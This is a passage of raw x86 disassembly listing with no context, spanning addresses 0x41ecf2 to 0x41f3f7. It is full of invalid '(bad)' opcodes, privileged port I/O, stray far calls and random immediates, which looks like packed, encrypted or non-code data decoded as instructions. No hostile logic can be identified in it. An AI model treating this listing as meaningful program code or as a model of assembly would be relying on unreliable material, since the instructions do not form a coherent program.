  41ecf2:	cwde   
  41ecf3:	xor    eax,0x8a54004d
  41ecf8:	mov    dl,0x82
  41ecfa:	mov    cl,0x2e
  41ecfc:	out    0x17,al
  41ecfe:	imul   eax,DWORD PTR [ebx+0x3c6ee1ac],0x12
  41ed05:	cmp    al,0x42
  41ed07:	push   esi
  41ed08:	inc    ebp
  41ed09:	jmp    0x5846efd4
  41ed0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed0f:	aas    
  41ed10:	test   BYTE PTR [ebx-0x4a],ch
  41ed13:	(bad)  [ebp-0x76564401]
  41ed19:	test   DWORD PTR es:[edx+0x4f],edx
  41ed1d:	mov    dl,0xca
  41ed1f:	pop    ecx
  41ed20:	adc    eax,0x6ec4f5c6
  41ed25:	sub    esp,edi
  41ed27:	mov    ecx,0x910b4f39
  41ed2c:	hlt    
  41ed2d:	push   ebx
  41ed2e:	scas   eax,DWORD PTR es:[edi]
  41ed2f:	shl    DWORD PTR [esi-0x34],0xa7
  41ed33:	(bad)  
  41ed35:	cs (bad) 
  41ed37:	inc    DWORD PTR [ebx+0x3f21467d]
  41ed3d:	push   ds
  41ed3e:	adc    al,0x51
  41ed40:	outs   dx,DWORD PTR ds:[esi]
  41ed41:	inc    edi
  41ed42:	iret   
  41ed43:	lods   eax,DWORD PTR ds:[esi]
  41ed44:	shr    al,cl
  41ed46:	and    BYTE PTR [eax+eiz*4+0x79],dh
  41ed4a:	repz jg 0x41ed58
  41ed4d:	cmp    al,0xb5
  41ed4f:	nop
  41ed50:	pop    edx
  41ed51:	iret   
  41ed52:	and    al,0x3c
  41ed54:	xchg   ecx,eax
  41ed55:	jge    0x41ed4e
  41ed57:	fwait
  41ed58:	mov    esp,0xf56ef998
  41ed5d:	add    ebx,esi
  41ed5f:	jmp    0x41ed8b
  41ed61:	mov    cl,0xde
  41ed63:	xor    dl,ch
  41ed65:	lds    ecx,FWORD PTR [eax+0x7fa4b2e3]
  41ed6b:	mov    esi,esp
  41ed6d:	inc    ebp
  41ed6e:	aam    0xb2
  41ed70:	mov    ebx,0x1c3e075c
  41ed75:	adc    eax,0xb76eddd9
  41ed7a:	fidiv  DWORD PTR [esi+0x5b8ecdce]
  41ed80:	loope  0x41ede1
  41ed82:	ds xchg edi,eax
  41ed84:	and    BYTE PTR [ebp+0x5ea65336],ch
  41ed8a:	fcmovnbe st,st(3)
  41ed8c:	int3   
  41ed8d:	xchg   DWORD PTR [ecx],ecx
  41ed8f:	pop    ds
  41ed90:	sahf   
  41ed91:	ins    DWORD PTR es:[edi],dx
  41ed92:	push   cs
  41ed93:	mov    ah,0x20
  41ed95:	daa    
  41ed96:	push   eax
  41ed97:	xchg   ebx,ebp
  41ed99:	xor    BYTE PTR [esi+0x7c],bh
  41ed9c:	cwde   
  41ed9d:	cli    
  41ed9e:	stos   DWORD PTR es:[edi],eax
  41ed9f:	adc    al,0xd9
  41eda1:	fisttp WORD PTR [ebx-0x69a2b8b1]
  41eda7:	xchg   ebx,eax
  41eda8:	inc    esi
  41eda9:	pusha  
  41edaa:	mov    bl,0xa9
  41edac:	(bad)  
  41edad:	cmp    al,0xab
  41edaf:	mov    al,0xe3
  41edb1:	dec    ecx
  41edb2:	popa   
  41edb3:	adc    BYTE PTR [ebx+0x3f],dh
  41edb6:	sub    al,BYTE PTR [esi+0x1c]
  41edb9:	pop    esi
  41edba:	aaa    
  41edbb:	sub    ebx,0xffffffdb
  41edbe:	xor    BYTE PTR [ebp+0x737be8b9],0x86
  41edc5:	dec    eax
  41edc6:	push   ebp
  41edc7:	jns    0x41ee0f
  41edc9:	je     0x41ed4d
  41edcb:	jne    0x41ed7e
  41edcd:	pop    ds
  41edce:	sbb    edx,DWORD PTR ds:0x3656153
  41edd4:	adc    DWORD PTR [eax+0x7724d594],ebp
  41edda:	jns    0x41ed64
  41eddc:	xchg   BYTE PTR [edx-0x7d],dh
  41eddf:	data16 lock js 0x41ee42
  41ede3:	jl     0x41ed79
  41ede5:	push   edx
  41ede6:	popa   
  41ede7:	call   0x4ff1ce22
  41edec:	mov    ds:0x2952990c,al
  41edf1:	jecxz  0x41edc5
  41edf3:	iret   
  41edf4:	cmp    dh,BYTE PTR [ecx+0x52]
  41edf7:	cmp    ch,dl
  41edf9:	and    BYTE PTR [esi-0x48],bh
  41edfc:	jno    0x41ee0c
  41edfe:	xchg   dl,dl
  41ee00:	icebp  
  41ee01:	and    DWORD PTR [edi-0x45],ecx
  41ee04:	add    ebx,ebx
  41ee06:	or     al,0xaa
  41ee08:	sbb    bh,dh
  41ee0a:	jmp    0x559b62af
  41ee0f:	cwde   
  41ee10:	gs dec edx
  41ee12:	adc    eax,DWORD PTR [ebp+0x13]
  41ee15:	imul   BYTE PTR [edx+0x2e]
  41ee18:	mov    bh,BYTE PTR [bp+di+0x78]
  41ee1c:	gs xchg ebp,eax
  41ee1e:	inc    edi
  41ee1f:	retf   0xfe36
  41ee22:	mov    al,0x1f
  41ee24:	popa   
  41ee25:	mov    ds:0x7ecfea37,al
  41ee2a:	(bad)  
  41ee2b:	cmc    
  41ee2c:	rcl    DWORD PTR [ebx+0x49dbfd06],cl
  41ee32:	xchg   edx,eax
  41ee33:	xchg   dh,al
  41ee35:	jbe    0x41ee08
  41ee37:	push   ebx
  41ee38:	pop    edi
  41ee39:	outs   dx,BYTE PTR ds:[esi]
  41ee3a:	rcl    DWORD PTR [esi+0x19],cl
  41ee3d:	test   eax,0xa49c9d5b
  41ee42:	out    0x41,eax
  41ee44:	inc    edi
  41ee45:	push   cs
  41ee46:	in     eax,dx
  41ee47:	xlat   BYTE PTR ds:[ebx]
  41ee48:	adc    al,0x61
  41ee4a:	fnsave [esi+0x21849eb0]
  41ee50:	test   eax,0x61a7c6f3
  41ee55:	test   al,0x5
  41ee57:	dec    ebp
  41ee58:	dec    eax
  41ee59:	enter  0xec4b,0xe1
  41ee5d:	clc    
  41ee5e:	sub    ah,BYTE PTR [ebp-0x67a10486]
  41ee64:	icebp  
  41ee65:	sbb    ecx,DWORD PTR [ebx-0x6]
  41ee68:	dec    ecx
  41ee69:	push   es
  41ee6a:	push   edx
  41ee6b:	sub    DWORD PTR [edi],0xffffffe9
  41ee6e:	fild   DWORD PTR [ebx]
  41ee70:	xchg   eax,edx
  41ee72:	mov    esp,0x7cc2785a
  41ee77:	fisubr WORD PTR [ebp-0xd]
  41ee7a:	(bad)  
  41ee7b:	imul   edx,DWORD PTR [ecx],0x2a
  41ee7e:	dec    edx
  41ee7f:	pop    ds
  41ee80:	add    BYTE PTR [ecx-0x9c6b172],ah
  41ee86:	pop    esi
  41ee87:	outs   dx,BYTE PTR ds:[esi]
  41ee88:	inc    esi
  41ee89:	call   0x6ce9:0x10e150ae
  41ee90:	outs   dx,DWORD PTR ds:[esi]
  41ee91:	inc    eax
  41ee92:	(bad)  
  41ee94:	arpl   WORD PTR [ecx-0x71ea1ed9],sp
  41ee9a:	stos   DWORD PTR es:[edi],eax
  41ee9b:	addr16 rcr DWORD PTR [di+0x6c7d],cl
  41eea1:	dec    edi
  41eea2:	outs   dx,DWORD PTR ds:[esi]
  41eea3:	sbb    esp,DWORD PTR [edi]
  41eea5:	dec    eax
  41eea6:	mov    al,BYTE PTR [eax+0x61ae8351]
  41eeac:	cld    
  41eead:	mov    ch,bl
  41eeaf:	div    BYTE PTR [ecx]
  41eeb1:	mul    BYTE PTR [ebp+0x32]
  41eeb4:	xor    ch,BYTE PTR [ecx+0x51]
  41eeb7:	ins    DWORD PTR es:[edi],dx
  41eeb8:	mov    eax,ds:0x963ec9d6
  41eebd:	xchg   edi,eax
  41eebe:	adc    al,0x8c
  41eec0:	(bad)  
  41eec1:	ins    DWORD PTR es:[edi],dx
  41eec2:	add    al,0x5b
  41eec4:	mov    dl,0x55
  41eec6:	lods   al,BYTE PTR ds:[esi]
  41eec7:	out    dx,al
  41eec8:	dec    ecx
  41eec9:	out    dx,al
  41eeca:	adc    ecx,DWORD PTR [edx]
  41eecc:	xor    BYTE PTR [edi-0x3368fcf5],0xca
  41eed3:	mov    al,ds:0x7bf01d21
  41eed8:	mov    fs,WORD PTR [eax+0x79]
  41eedb:	ret    
  41eedc:	mov    BYTE PTR [eax],ah
  41eede:	lahf   
  41eedf:	aad    0x36
  41eee1:	jae    0x41eeae
  41eee3:	(bad)  
  41eee4:	jmp    0x5515:0x164d489
  41eeeb:	cmovo  eax,DWORD PTR [esi-0x6db50e4a]
  41eef2:	adc    al,0x34
  41eef4:	cmp    bl,BYTE PTR [ecx+0x2eb3cc57]
  41eefa:	inc    esi
  41eefb:	add    DWORD PTR [eax+0x3826eb2c],0x7
  41ef02:	adc    eax,0xb0196270
  41ef07:	out    0xf3,al
  41ef09:	add    al,0x8a
  41ef0b:	(bad)  
  41ef0c:	int    0x56
  41ef0e:	jnp    0x41ef1d
  41ef10:	sub    al,0x3e
  41ef12:	cmc    
  41ef13:	neg    BYTE PTR [edi+0x14]
  41ef16:	mov    ds:0xbb3ea021,eax
  41ef1b:	jb     0x41eec7
  41ef1d:	aaa    
  41ef1e:	cmp    esi,ecx
  41ef20:	jmp    0x41ef5e
  41ef22:	sbb    ebp,0x8df9f44a
  41ef28:	or     eax,DWORD PTR [edx-0x2648ae92]
  41ef2e:	cmp    DWORD PTR [edx+0x69],ebp
  41ef31:	inc    eax
  41ef32:	pop    edi
  41ef33:	cwde   
  41ef34:	loope  0x41ef7a
  41ef36:	xor    eax,0xf13a1cae
  41ef3b:	push   ebx
  41ef3c:	mov    edx,0xfee957e5
  41ef41:	retf   0xb119
  41ef44:	pop    es
  41ef45:	repz jne 0x41ef92
  41ef48:	hlt    
  41ef49:	add    BYTE PTR [edi-0x7e79379f],ch
  41ef4f:	lods   eax,DWORD PTR ds:[esi]
  41ef50:	cwde   
  41ef51:	retf   
  41ef52:	dec    edx
  41ef53:	mov    DWORD PTR [edx-0x31c9a23],ebx
  41ef59:	loopne 0x41ef3a
  41ef5b:	mov    ah,BYTE PTR [esp+edx*4-0x7c674949]
  41ef62:	or     DWORD PTR [edi-0x66],ebx
  41ef65:	xchg   esi,eax
  41ef66:	or     al,0xcc
  41ef68:	stc    
  41ef69:	push   0x748243f3
  41ef6e:	sbb    ebx,esp
  41ef70:	call   0xfb9e:0x937acbff
  41ef77:	outs   dx,DWORD PTR ds:[esi]
  41ef78:	dec    dx
  41ef7a:	pmullw mm6,QWORD PTR [esi-0x4d]
  41ef7e:	sbb    bl,BYTE PTR [ebx+0x23ad8c44]
  41ef84:	inc    esp
  41ef85:	or     DWORD PTR [esp+ebx*2+0x5a],ebx
  41ef89:	add    edx,0x7e
  41ef8c:	out    dx,al
  41ef8d:	scas   eax,DWORD PTR es:[edi]
  41ef8e:	pop    edx
  41ef8f:	js     0x41ef30
  41ef91:	xchg   BYTE PTR [ebp-0x4d],dl
  41ef94:	scas   al,BYTE PTR es:[edi]
  41ef95:	inc    ecx
  41ef96:	popf   
  41ef97:	idiv   cl
  41ef99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef9a:	fist   WORD PTR [ebx-0x7a8e977a]
  41efa0:	in     eax,dx
  41efa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efa2:	jg     0x41ef32
  41efa4:	hlt    
  41efa5:	dec    ebp
  41efa6:	icebp  
  41efa7:	push   edi
  41efa8:	push   edx
  41efa9:	out    0xd3,eax
  41efab:	int    0x18
  41efad:	stc    
  41efae:	js     0x41efd0
  41efb0:	fdivr  DWORD PTR [bx+0x3500]
  41efb5:	inc    esp
  41efb6:	pop    eax
  41efb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efb8:	imul   esi,DWORD PTR [esi-0x27],0x1ba172bf
  41efbf:	out    dx,al
  41efc0:	(bad)  
  41efc1:	clc    
  41efc2:	sbb    BYTE PTR [ecx+ebx*8],bl
  41efc5:	sbb    al,0x19
  41efc7:	push   esp
  41efc8:	sti    
  41efc9:	push   0xe4e4c5a7
  41efce:	daa    
  41efcf:	lahf   
  41efd0:	les    ebp,FWORD PTR [eax]
  41efd2:	cli    
  41efd3:	cmp    DWORD PTR [ebx+0x5d],0x90336b9a
  41efda:	lods   eax,DWORD PTR ds:[esi]
  41efdb:	into   
  41efdc:	push   cs
  41efdd:	inc    edx
  41efde:	sahf   
  41efdf:	sbb    esi,DWORD PTR [esi+0x7804f8f0]
  41efe5:	cs cmp al,0x39
  41efe8:	fstp   QWORD PTR [edi]
  41efea:	cli    
  41efeb:	mov    ebp,0xbd25b90f
  41eff0:	bound  edx,QWORD PTR [esp+eiz*8]
  41eff3:	push   edx
  41eff4:	cmc    
  41eff5:	(bad)  
  41eff6:	adc    ebx,esp
  41eff8:	push   edx
  41eff9:	jae    0x41efdb
  41effb:	mov    ds:0xf12a3692,al
  41f000:	xlat   BYTE PTR ds:[ebx]
  41f001:	pop    ebp
  41f002:	pop    edx
  41f003:	sbb    al,0x70
  41f005:	inc    ah
  41f007:	out    dx,al
  41f008:	mov    eax,0x8f1a6ddb
  41f00d:	in     eax,dx
  41f00e:	fcom   QWORD PTR [esp+eax*1-0x6f9e77ae]
  41f015:	ret    0xbfa6
  41f018:	and    al,BYTE PTR [ecx+0x2f07abf9]
  41f01e:	cdq    
  41f01f:	adc    al,0x74
  41f021:	stc    
  41f022:	je     0x41f050
  41f024:	out    0xf2,al
  41f026:	lock outs dx,BYTE PTR ds:[esi]
  41f028:	pop    edi
  41f029:	into   
  41f02a:	push   edi
  41f02b:	hlt    
  41f02c:	les    esi,FWORD PTR [eax-0x38]
  41f02f:	scas   al,BYTE PTR es:[edi]
  41f030:	in     al,0xdd
  41f032:	outs   dx,BYTE PTR ds:[esi]
  41f033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f034:	ror    DWORD PTR [esi+0x79cf92af],0x48
  41f03b:	jecxz  0x41f04f
  41f03d:	loop   0x41f040
  41f03f:	sub    esp,ebp
  41f041:	in     al,dx
  41f042:	cwde   
  41f043:	les    edi,FWORD PTR [ebp+ebx*1-0x2d]
  41f047:	sbb    BYTE PTR [edi+0x663a61bf],dl
  41f04d:	das    
  41f04e:	int    0xc3
  41f050:	lea    edx,[esi+0x17]
  41f053:	es popf 
  41f055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f056:	pop    ecx
  41f057:	push   0x1fde1bba
  41f05c:	pop    es
  41f05d:	retf   
  41f05e:	jbe    0x41f0a9
  41f060:	mov    cl,0x4a
  41f062:	mov    ebp,0x84466c50
  41f067:	pop    ds
  41f068:	inc    edx
  41f069:	stos   DWORD PTR es:[edi],eax
  41f06a:	cld    
  41f06b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f06c:	in     al,dx
  41f06d:	cmp    bl,ah
  41f06f:	(bad)  
  41f070:	ds or  eax,0x83221216
  41f076:	xor    eax,0xa58fb8d8
  41f07b:	and    eax,0x883da94
  41f080:	pop    esp
  41f081:	imul   edx,DWORD PTR [eax-0x59bd4788],0xffffffc0
  41f088:	pop    edx
  41f089:	mov    esi,0x5672508c
  41f08e:	popf   
  41f08f:	ret    
  41f090:	xchg   BYTE PTR [esi+0x21],bh
  41f093:	mov    al,0x26
  41f095:	jno    0x41f0f9
  41f097:	stos   DWORD PTR es:[edi],eax
  41f098:	out    dx,eax
  41f099:	aad    0x1
  41f09b:	rcl    edx,1
  41f09d:	pop    es
  41f09e:	inc    esi
  41f09f:	addr16 cmc 
  41f0a1:	les    eax,FWORD PTR [ebx+ebp*4+0x109d25f8]
  41f0a8:	call   0x693a:0x8d4121ea
  41f0af:	push   edx
  41f0b0:	test   eax,0x9850d312
  41f0b5:	xchg   DWORD PTR [ebp+ebx*4+0x25],edi
  41f0b9:	mov    edx,0x986e3ab1
  41f0be:	loop   0x41f0aa
  41f0c0:	push   0xff2a7dde
  41f0c5:	dec    eax
  41f0c6:	mov    WORD PTR [eax+eiz*8-0x1a],?
  41f0ca:	cmp    DWORD PTR [ecx],esp
  41f0cc:	inc    eax
  41f0cd:	sti    
  41f0ce:	(bad)  
  41f0cf:	int3   
  41f0d0:	cmp    BYTE PTR [edi],cl
  41f0d2:	dec    edi
  41f0d3:	dec    ebx
  41f0d4:	leave  
  41f0d5:	into   
  41f0d6:	inc    ecx
  41f0d7:	add    DWORD PTR [eax+0x35],eax
  41f0da:	daa    
  41f0db:	mov    esi,0xbd48e553
  41f0e0:	(bad)  
  41f0e1:	or     dl,BYTE PTR [ebp+0x18]
  41f0e4:	cld    
  41f0e5:	stc    
  41f0e6:	test   DWORD PTR [ebx],edi
  41f0e8:	mov    edi,0xf85271b
  41f0ed:	test   BYTE PTR [ecx+0x19],bh
  41f0f0:	mov    ds:0x322c24d3,eax
  41f0f5:	jnp    0x41f10d
  41f0f7:	mov    eax,0x733aa7b8
  41f0fc:	pop    esp
  41f0fd:	sbb    edx,0x12
  41f100:	fld    QWORD PTR [eax+ebp*2+0x13]
  41f104:	leave  
  41f105:	cwde   
  41f106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f107:	push   ebx
  41f108:	add    BYTE PTR [esi-0x39],bh
  41f10b:	cs mov ebp,0x7e57a707
  41f111:	mov    bh,0x9b
  41f113:	imul   edx,esp,0xffffffee
  41f116:	in     al,dx
  41f117:	push   cs
  41f118:	addr16 in al,0x95
  41f11b:	aam    0xae
  41f11d:	pop    ebx
  41f11e:	mov    edx,0x4c3c5001
  41f123:	xor    eax,0x85396a92
  41f128:	inc    ebp
  41f129:	in     eax,dx
  41f12a:	push   edi
  41f12b:	fwait
  41f12c:	lds    esp,FWORD PTR [ebp-0x7ab58ad8]
  41f132:	push   esi
  41f133:	loope  0x41f0fd
  41f135:	jnp    0x41f0f1
  41f137:	stos   DWORD PTR es:[edi],eax
  41f138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f139:	cmp    BYTE PTR [edi],dl
  41f13b:	sub    bh,BYTE PTR [ecx]
  41f13d:	mov    cl,0xd1
  41f13f:	push   edi
  41f140:	or     ch,dl
  41f142:	or     DWORD PTR [ecx-0x6b66388d],ecx
  41f148:	pushf  
  41f149:	fbld   TBYTE PTR [edi+0x255be3ff]
  41f14f:	xor    BYTE PTR [ebx-0x5bc4aa61],dh
  41f155:	sti    
  41f156:	sub    al,0xb8
  41f158:	mov    ?,esi
  41f15a:	and    DWORD PTR [esi],0xffffffed
  41f15d:	pop    ebx
  41f15e:	add    al,BYTE PTR [edi+esi*2-0x46]
  41f162:	mov    esi,0x76e6ddf1
  41f167:	sbb    BYTE PTR [ebx+0x72f70347],al
  41f16d:	sbb    al,BYTE PTR [eax-0x9]
  41f170:	mov    esp,0x65aad783
  41f175:	cli    
  41f176:	mov    edi,0xf7afd378
  41f17b:	icebp  
  41f17c:	fbstp  TBYTE PTR [edi]
  41f17f:	lds    ebx,FWORD PTR [esi-0x62]
  41f182:	cwde   
  41f183:	shrd   DWORD PTR [esi],ecx,0xb4
  41f187:	or     esi,DWORD PTR [ecx-0x6b890d48]
  41f18d:	aaa    
  41f18e:	rcr    BYTE PTR [edi-0x589b2ad5],0x64
  41f195:	fadd   QWORD PTR [ecx]
  41f197:	(bad)  
  41f198:	out    dx,eax
  41f199:	cmp    ecx,DWORD PTR [edi+0x227850cc]
  41f19f:	repnz in eax,dx
  41f1a1:	mov    bh,0xca
  41f1a3:	add    BYTE PTR [ecx],ah
  41f1a5:	add    al,0x12
  41f1a7:	add    eax,0xfde0bdc5
  41f1ac:	and    eax,0x9775ccc0
  41f1b1:	add    bl,BYTE PTR [edx-0x62f1bba7]
  41f1b7:	or     eax,0xc64a4566
  41f1bc:	inc    ecx
  41f1bd:	inc    ebx
  41f1be:	and    al,0x62
  41f1c0:	outs   dx,BYTE PTR ds:[esi]
  41f1c1:	rcl    DWORD PTR [edi+0x527c421b],0xbb
  41f1c8:	xchg   edi,eax
  41f1c9:	dec    esi
  41f1ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1cb:	mov    ds:0x36b33d1d,eax
  41f1d0:	cmp    BYTE PTR [edx+edi*4],cl
  41f1d3:	mov    bh,0xc2
  41f1d5:	aas    
  41f1d6:	mov    ds:0x5eb009ae,eax
  41f1db:	xchg   ebx,eax
  41f1dc:	cmp    al,0x72
  41f1de:	xchg   ebx,eax
  41f1df:	mov    ch,0xf
  41f1e1:	xchg   ebp,eax
  41f1e2:	test   al,0xf0
  41f1e4:	jle    0x41f1e1
  41f1e6:	stos   DWORD PTR es:[edi],eax
  41f1e7:	cmp    esp,edi
  41f1e9:	addr16 cwde 
  41f1eb:	cld    
  41f1ec:	fstp   st(2)
  41f1ee:	mov    esi,0x39da7fa7
  41f1f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1f4:	xor    eax,0x2488ec22
  41f1f9:	int3   
  41f1fa:	rcr    BYTE PTR [ebx],cl
  41f1fc:	rcl    DWORD PTR [edx+0x5db44b22],1
  41f202:	loop   0x41f1cb
  41f204:	fst    QWORD PTR [ebx+0x55]
  41f207:	mov    ecx,0xd5007e50
  41f20c:	retf   0x115e
  41f20f:	scas   al,BYTE PTR es:[edi]
  41f210:	shl    BYTE PTR [edi],cl
  41f212:	add    bh,BYTE PTR ds:0xaf44a3f8
  41f218:	dec    edx
  41f219:	mov    dl,0xf2
  41f21b:	fst    DWORD PTR [eax]
  41f21d:	(bad)  
  41f21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f21f:	mov    eax,0x107ebfee
  41f224:	sub    DWORD PTR [edi+0x40],esp
  41f227:	fsubrp st(0),st
  41f229:	or     esp,DWORD PTR [esi]
  41f22b:	sbb    BYTE PTR [edi-0x50],ch
  41f22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f22f:	mov    esi,0xedc15fd3
  41f234:	adc    esi,DWORD PTR [ebx]
  41f236:	imul   esp,esp,0x53caa431
  41f23c:	icebp  
  41f23d:	mov    bl,0x9
  41f23f:	mov    eax,0xefa28d93
  41f244:	dec    edx
  41f245:	clc    
  41f246:	stos   DWORD PTR es:[edi],eax
  41f247:	jo     0x41f220
  41f249:	inc    ebx
  41f24a:	jb     0x41f2ae
  41f24c:	loope  0x41f26b
  41f24e:	inc    BYTE PTR [edx+0x4d0cb53e]
  41f254:	push   eax
  41f255:	scas   al,BYTE PTR es:[edi]
  41f256:	dec    edx
  41f257:	rol    DWORD PTR [ecx+0x45],cl
  41f25a:	xor    eax,0x68775b5a
  41f25f:	adc    BYTE PTR [eax],bh
  41f261:	or     bl,0x59
  41f264:	xchg   esi,eax
  41f265:	dec    edi
  41f266:	lods   eax,DWORD PTR ds:[esi]
  41f267:	mov    esi,0x1fc3f92
  41f26c:	jbe    0x41f274
  41f26e:	jne    0x41f2d1
  41f270:	inc    ebp
  41f271:	sbb    eax,0x910664b9
  41f276:	rcl    DWORD PTR [ebp-0x7db1599],1
  41f27c:	mov    dl,BYTE PTR [eax]
  41f27e:	into   
  41f27f:	xchg   ebx,eax
  41f280:	adc    BYTE PTR [ebp+0x8],bh
  41f283:	sbb    BYTE PTR [ebx+0x38dd3d30],0x8
  41f28a:	mov    ds:0xd4a1935d,eax
  41f28f:	jp     0x41f2f6
  41f291:	push   edx
  41f292:	add    DWORD PTR [edx+eiz*8+0x24],edx
  41f296:	sar    ebx,0x6f
  41f299:	scas   eax,DWORD PTR es:[edi]
  41f29a:	dec    edx
  41f29b:	push   0x3f8ba7f0
  41f2a0:	fnstsw WORD PTR [edi-0x77f837ec]
  41f2a6:	lods   eax,DWORD PTR ds:[esi]
  41f2a7:	ret    
  41f2a8:	pop    eax
  41f2a9:	and    al,0x56
  41f2ab:	xor    edx,DWORD PTR [edx+edi*8+0x40]
  41f2af:	jl     0x41f2ef
  41f2b1:	sbb    BYTE PTR [edi],bh
  41f2b3:	ins    BYTE PTR es:[edi],dx
  41f2b4:	fucomp st(1)
  41f2b6:	cmp    al,0x54
  41f2b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2b9:	xor    ecx,esi
  41f2bb:	rcr    BYTE PTR [edx-0x78],0xbd
  41f2bf:	int3   
  41f2c0:	ret    0x57b1
  41f2c3:	ds loop 0x41f2e7
  41f2c6:	dec    ebx
  41f2c7:	mov    bl,0x26
  41f2c9:	fdiv   DWORD PTR [esi+eax*4+0xd]
  41f2cd:	push   ss
  41f2ce:	mov    DWORD PTR [eax-0x26],ecx
  41f2d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2d2:	mov    ebx,0xbcef336
  41f2d7:	das    
  41f2d8:	outs   dx,BYTE PTR ds:[esi]
  41f2d9:	pop    es
  41f2da:	in     al,0x10
  41f2dc:	popa   
  41f2dd:	add    eax,0x99e2dfcc
  41f2e2:	sbb    al,0x50
  41f2e4:	jecxz  0x41f2b1
  41f2e6:	mov    esp,0x6ba85881
  41f2eb:	pop    edi
  41f2ec:	out    0xb2,eax
  41f2ee:	pop    es
  41f2ef:	xor    eax,0x6364031f
  41f2f4:	mov    WORD PTR [edx+0x2c],ss
  41f2f7:	outs   dx,BYTE PTR ds:[esi]
  41f2f8:	outs   dx,DWORD PTR ds:[esi]
  41f2f9:	xchg   ebx,eax
  41f2fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2fb:	or     DWORD PTR [edi+edx*1+0x38],edx
  41f2ff:	mov    al,ds:0x5eef294c
  41f304:	lock sbb al,0x7c
  41f307:	xchg   edx,eax
  41f308:	cdq    
  41f309:	inc    esi
  41f30a:	lods   eax,DWORD PTR ds:[esi]
  41f30b:	mov    edi,0x32316b67
  41f310:	xchg   edi,eax
  41f311:	iret   
  41f312:	(bad)  
  41f313:	jp     0x41f368
  41f315:	mov    dl,0x53
  41f317:	and    esi,0xffffff97
  41f31a:	das    
  41f31b:	jo     0x41f37f
  41f31d:	ficomp WORD PTR [edi+0x20]
  41f320:	shl    DWORD PTR [edx+0x45],cl
  41f323:	sub    eax,0x35c108df
  41f328:	int3   
  41f329:	adc    DWORD PTR [edi+0x67],esp
  41f32c:	xchg   ebp,eax
  41f32d:	sbb    BYTE PTR [eax+0x432ab119],0x7e
  41f334:	scas   al,BYTE PTR es:[edi]
  41f335:	stos   BYTE PTR es:[edi],al
  41f336:	mov    al,0xe2
  41f338:	mov    eax,0x9bfea021
  41f33d:	lahf   
  41f33e:	push   0x24
  41f340:	gs pop esp
  41f342:	mov    ecx,0x3be10b9f
  41f347:	push   edx
  41f348:	inc    ebx
  41f349:	cbw    
  41f34b:	fdiv   QWORD PTR [edx-0x52]
  41f34e:	jns    0x41f353
  41f350:	(bad)  
  41f351:	dec    ebp
  41f352:	lds    eax,FWORD PTR [edi+0x585f99ec]
  41f358:	(bad)  
  41f359:	mov    eax,0x94d6242d
  41f35e:	cdq    
  41f35f:	iret   
  41f360:	add    bl,BYTE PTR [ebp+0x5ef9f732]
  41f366:	repz push eax
  41f368:	lods   eax,DWORD PTR ds:[esi]
  41f369:	xchg   esi,eax
  41f36a:	into   
  41f36b:	shl    BYTE PTR [ebx],0xeb
  41f36e:	xor    al,0x13
  41f370:	neg    edx
  41f372:	scas   al,BYTE PTR es:[edi]
  41f373:	into   
  41f374:	out    0xd9,al
  41f376:	inc    eax
  41f377:	fwait
  41f378:	push   ebp
  41f379:	xor    DWORD PTR [esi-0x2ce6b807],esp
  41f37f:	jae    0x41f393
  41f381:	arpl   WORD PTR [ebx],bx
  41f383:	sub    eax,DWORD PTR [ebx]
  41f385:	sbb    al,0x75
  41f387:	inc    ebx
  41f388:	push   esp
  41f389:	jb     0x41f3c2
  41f38b:	mov    al,0xdf
  41f38d:	ins    DWORD PTR es:[edi],dx
  41f38e:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41f390:	imul   ebx,DWORD PTR [ecx+0x7],0x4f08edcb
  41f397:	or     ecx,DWORD PTR [esi]
  41f399:	mov    edi,0x778111bd
  41f39e:	push   ss
  41f39f:	pop    ecx
  41f3a0:	pushf  
  41f3a1:	lea    ecx,[edx]
  41f3a3:	push   di
  41f3a5:	mov    ds:0xe8f9ec26,eax
  41f3aa:	stos   BYTE PTR es:[edi],al
  41f3ab:	mov    dh,0x97
  41f3ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3ae:	int3   
  41f3af:	pop    ecx
  41f3b0:	cmp    DWORD PTR [ebp+0xc],ebx
  41f3b3:	call   0xf862:0x7aaeb065
  41f3ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3bb:	xchg   ebp,eax
  41f3bc:	dec    edx
  41f3bd:	daa    
  41f3be:	xor    eax,0x87e47343
  41f3c3:	inc    esp
  41f3c4:	add    ch,BYTE PTR [eax+0x44]
  41f3c7:	push   ecx
  41f3c8:	ds pop ebp
  41f3ca:	cmp    BYTE PTR [edx+0x3d30132a],dh
  41f3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3d1:	pop    edx
  41f3d2:	call   0xdefae12
  41f3d7:	jns    0x778d70d1
  41f3dd:	outs   dx,BYTE PTR ds:[esi]
  41f3de:	xor    BYTE PTR [edx+0x6e],ch
  41f3e1:	test   BYTE PTR [ecx],dh
  41f3e3:	xchg   ebp,eax
  41f3e4:	dec    esi
  41f3e5:	rcl    BYTE PTR [ecx+edx*1+0x32],1
  41f3e9:	into   
  41f3ea:	out    0x1b,eax
  41f3ec:	(bad)  
  41f3ed:	dec    esp
  41f3ee:	cmp    bl,BYTE PTR [ebp+0x33]
  41f3f1:	in     eax,0x96
  41f3f3:	imul   esi,DWORD PTR [ebx-0x6d],0x71
  41f3f7:	or     ch,BYTE PTR [eax]
